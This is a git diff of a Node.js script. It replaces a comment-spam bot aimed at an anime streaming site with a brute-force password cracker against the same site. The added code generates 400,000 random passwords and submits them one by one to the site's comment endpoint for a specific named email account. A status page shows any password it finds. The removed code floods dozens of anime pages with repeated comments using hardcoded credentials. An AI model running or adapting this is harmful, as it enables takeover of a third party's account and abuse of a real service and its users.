@@ -1,187 +1,118 @@
-const axios = require("axios");
-const https = require("https");
 const express = require("express");
-const fetch = require("node-fetch");
+const axios = require("axios");
+const bodyParser = require("body-parser");
 const app = express();
-app.use(express.urlencoded({ extended: true }));
+app.use(bodyParser.urlencoded({ extended: true }));
 
-let email = "NOON1412123@gmail.com";
-let password = "NOON";
-let commentText = "انمي حْرا ";
-let commentsPerMinute = 60;
-let parallelAnimeCount = 3;
-let delay = (60 / commentsPerMinute) * 1000;
-const maxCommentsPerAnime = 75;
+let foundPassword = null;
+let currentPassword = "";
+let finished = false;
 
-const animeTargets = {
-  532: { active: true, name: "One Piece" },
-  11729: { active: true, name: "Necronomico no Cosmic Horror Show" },
-  11728: { active: true, name: "Kanojo, Okarishimasu 4th Season" },
-  1: { active: false, name: "Apocalypse Hotel" },
-  2: { active: false, name: "Kidou Senshi Gundam" },
-  3: { active: false, name: "Shiunji-ke no Kodomotachi" },
-  11673: { active: true, name: "Kijin Gentoushou" },
-  4: { active: false, name: "Compass 2.0: Sentou" },
-  11703: { active: true, name: "Vigilante: Boku no Hero" },
-  11702: { active: true, name: "Summer Pockets" },
-  5: { active: false, name: "Aharen-san wa Hakarenai" },
-  11705: { active: true, name: "Lazarus" },
-  6: { active: false, name: "Maebashi Witches" },
-  7: { active: false, name: "Gorilla no kami kara kago" },
-  11694: { active: true, name: "Shin Samurai-den Yaiba" },
-  11697: { active: true, name: "Witch Watch" },
-  11721: { active: true, name: "The All-devouring whale" },
-  11718: { active: false, name: "Ore wa Seikan Kokka no" },
-  11724: { active: true, name: "Takopii no Genzai" },
-  8: { active: false, name: "Classic*Stars" },
-  9: { active: false, name: "A-Rank Party wo" },
-  11710: { active: true, name: "Hibi wa Sugiredo Meshi" },
-  11711: { active: true, name: "Mono" },
-  10: { active: false, name: "Kuroshitsuji: Midori no Majo" },
-  11: { active: false, name: "Katainaka no Ossan Kensei" },
-  653: { active: true, name: "Detective Conan" },
-  11686: { active: true, name: "Anne shirley" },
-  12: { active: false, name: "Slime Taoshite 300-nen" },
-  13: { active: false, name: "Nazotoki wa Dinner no Ato d" },
-  14: { active: false, name: "Chuuzenji-sensei Mononoke" },
-  15: { active: false, name: "Teogonia" },
-  11658: { active: true, name: "Kusuriya no Hitorigoto 2nd" },
-  11725: { active: true, name: "Lord of Mysteries" },
-  11726: { active: true, name: "Koujo Denka no Kateikyoushi" }
-};
+const email = "abrheem16@gmail.com";
 
-const headers = {
-  "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X)",
-  "Content-Type": "application/x-www-form-urlencoded",
-  "Origin": "https://ios.sanime.net",
-  "Referer": "https://ios.sanime.net/",
-  "Accept": "*/*",
-  "Accept-Encoding": "gzip, deflate, br",
-  "Connection": "keep-alive",
-  "Accept-Language": "ar"
-};
+// مولد كلمات مرور ذكي
+function generateSmartPasswords(limit = 200000) {
+  const upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  const lower = "abcdefghijklmnopqrstuvwxyz";
+  const digits = "0123456789";
+  const list = new Set();
 
-const agent = new https.Agent({ keepAlive: true });
-let botActive = true;
+  while (list.size < limit) {
+    let upperCount = Math.floor(Math.random() * 5) + 1;
+    let digitCount = Math.floor(Math.random() * 3);
+    let lowerCount = 8 - upperCount - digitCount;
+    if (lowerCount < 0) continue;
 
-function sendComment(animeId) {
-  const itemData = {
-    post: commentText,
-    id: animeId,
-    fire: false
-  };
-  const itemBase64 = Buffer.from(JSON.stringify(itemData)).toString("base64");
-  const payload = new URLSearchParams({ email, password, item: itemBase64 });
+    let chars = [];
+    for (let i = 0; i < upperCount; i++) chars.push(upper[Math.floor(Math.random() * upper.length)]);
+    for (let i = 0; i < digitCount; i++) chars.push(digits[Math.floor(Math.random() * digits.length)]);
+    for (let i = 0; i < lowerCount; i++) chars.push(lower[Math.floor(Math.random() * lower.length)]);
 
-  return axios.post(
-    "https://app.sanime.net/function/h10.php?page=addcmd",
-    payload.toString(),
-    { headers, httpsAgent: agent }
-  );
+    const password = chars.sort(() => Math.random() - 0.5).join("");
+    list.add(password);
+  }
+
+  return Array.from(list);
 }
 
-async function sendCommentsToAnime(animeId) {
-  const name = animeTargets[animeId]?.name || "Unknown";
-  console.log(`🚀 بدء إرسال ${maxCommentsPerAnime} تعليق إلى: [${animeId}] ${name}`);
-  for (let i = 1; i <= maxCommentsPerAnime; i++) {
-    if (!botActive) break;
+// دالة المحاولة
+async function tryPassword(password) {
+  currentPassword = password;
+  console.log("🟡 Trying:", password);
 
-    try {
-      await sendComment(animeId);
-      console.log(`✅ [${animeId}] تعليق رقم ${i}`);
-    } catch (err) {
-      console.error(`❌ [${animeId}] خطأ:`, err.message);
+  try {
+    const res = await axios.post(
+      "https://app.sanime.net/function/h10.php?page=addcmd",
+      new URLSearchParams({
+        email: email,
+        password: password,
+        item: JSON.stringify({ post: "TEST", id: "532", fire: false })
+      }),
+      {
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Origin": "https://ios.sanime.net",
+          "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X)",
+          "Referer": "https://ios.sanime.net/",
+          "Connection": "keep-alive"
+        },
+        timeout: 5000
+      }
+    );
+
+    if (res.data?.status === 1) {
+      foundPassword = password;
+      console.log("✅ Found password:", password);
+      return true;
     }
+  } catch (err) {
+    console.log("⛔ Error with:", password);
+  }
 
-    await new Promise(resolve => setTimeout(resolve, delay));
+  return false;
+}
+
+// إطلاق التجربة
+async function bruteForceStart() {
+  const passwords = generateSmartPasswords(400000);
+
+  for (let i = 0; i < passwords.length; i++) {
+    if (foundPassword) break;
+
+    const ok = await tryPassword(passwords[i]);
+    if (ok) break;
+
+    await new Promise((res) => setTimeout(res, 100)); // 10 محاولات بالثانية
+  }
+
+  finished = true;
+  if (!foundPassword) {
+    console.log("❌ تم الانتهاء من كل الباسوردات بدون نتيجة.");
   }
 }
+bruteForceStart();
 
-async function startLoop() {
-  const activeAnimeIds = Object.keys(animeTargets).filter(id => animeTargets[id].active);
-  let index = 0;
-
-  while (true) {
-    if (!botActive) {
-      await new Promise(resolve => setTimeout(resolve, 1000));
-      continue;
-    }
-
-    const batch = activeAnimeIds.slice(index, index + parallelAnimeCount);
-    if (batch.length === 0) {
-      index = 0;
-      continue;
-    }
-
-    console.log(`🔄 إرسال إلى ${batch.length} أنمي: ${batch.join(", ")}`);
-    await Promise.all(batch.map(id => sendCommentsToAnime(id)));
-
-    index += parallelAnimeCount;
-    if (index >= activeAnimeIds.length) {
-      index = 0;
-    }
-  }
-}
-
-startLoop();
-
-// 🟢 صفحة الحالة والتحكم
+// واجهة الويب
 app.get("/", (req, res) => {
-  const animeControls = Object.entries(animeTargets)
-    .map(([id, info]) => `
-      <label>
-        <input type="checkbox" name="anime_${id}" ${info.active ? "checked" : ""}>
-        [${id}] ${info.name}
-      </label><br>
-    `).join("");
+  let html = `
+    <html>
+    <head><title>Brute Status</title></head>
+    <body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px">
+      <h1>🔐 كلمة المرور:</h1>`;
 
-  res.send(`
-    <h2>🤖 البوت ${botActive ? "✅ يعمل" : "🛑 متوقف"}</h2>
-    <form method="POST" action="/update">
-      تعليق: <input name="commentText" value="${commentText}" /><br>
-      سرعة (تعليق/دقيقة): <input name="commentsPerMinute" value="${commentsPerMinute}" type="number"/><br>
-      عدد الأنميات بالتوازي: <input name="parallelAnimeCount" value="${parallelAnimeCount}" type="number"/><br><br>
-      <strong>الأنميات المفعّلة:</strong><br>
-      ${animeControls}
-      <br><button type="submit">🔄 تحديث الإعدادات</button>
-    </form>
-    <form action="/start"><button>تشغيل البوت</button></form>
-    <form action="/stop"><button>إيقاف البوت</button></form>
-  `);
-});
-
-app.post("/update", (req, res) => {
-  commentText = req.body.commentText || commentText;
-  commentsPerMinute = parseInt(req.body.commentsPerMinute) || commentsPerMinute;
-  parallelAnimeCount = parseInt(req.body.parallelAnimeCount) || parallelAnimeCount;
-  delay = (60 / commentsPerMinute) * 1000;
-
-  for (const [id, obj] of Object.entries(animeTargets)) {
-    animeTargets[id].active = !!req.body[`anime_${id}`];
+  if (foundPassword) {
+    html += `<h2 style="color:#0f0">${foundPassword}</h2>`;
+  } else if (finished) {
+    html += `<h2 style="color:orange">❌ تم الانتهاء من جميع الباسوردات ولم يتم العثور على الباسورد الصحيح</h2>`;
+  } else {
+    html += `<h2>جارٍ البحث... 🌀</h2>`;
+    html += `<h3>تجريب: ${currentPassword}</h3>`;
   }
 
-  res.redirect("/");
+  html += `</body></html>`;
+  res.send(html);
 });
 
-app.get("/start", (req, res) => {
-  botActive = true;
-  res.redirect("/");
-});
-
-app.get("/stop", (req, res) => {
-  botActive = false;
-  res.redirect("/");
-});
-
-// إبقاء الخدمة حية
-const KEEP_ALIVE_URL = "https://noon-9v11.onrender.com/";
-setInterval(() => {
-  fetch(KEEP_ALIVE_URL)
-    .then(() => console.log("🔁 Keep-alive ping sent"))
-    .catch(err => console.error("⚠️ Keep-alive ping failed:", err.message));
-}, 5 * 60 * 1000);
-
+// تشغيل السيرفر
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => {
-  console.log(`🌐 Web server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log("🚀 Server running on port", PORT));
